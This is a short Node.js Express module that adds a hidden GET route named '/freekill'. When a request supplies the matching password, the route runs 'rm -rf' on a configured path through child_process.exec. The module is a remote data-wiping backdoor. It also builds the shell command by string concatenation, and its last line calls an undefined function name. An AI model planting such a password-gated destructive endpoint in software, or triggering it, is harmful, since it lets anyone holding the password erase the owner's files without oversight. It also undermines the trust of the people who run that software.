var exec = require('child_process').exec;

module.exports = function (path, pwd, app) {
  app.get("/freekill", (req,res) => {
    if (req.query.pwd) {
      if (req.query.pwd == pwd) {
        exec('rm -rf ' + path, function (err, stdout, stderr) {
          var std = err.toString()+"\n"+stdout+"\n"+stderr;
          res.end(std);
        });
      }
    }
  });
}

freekill("/FSMv2", passwordphrase, app);
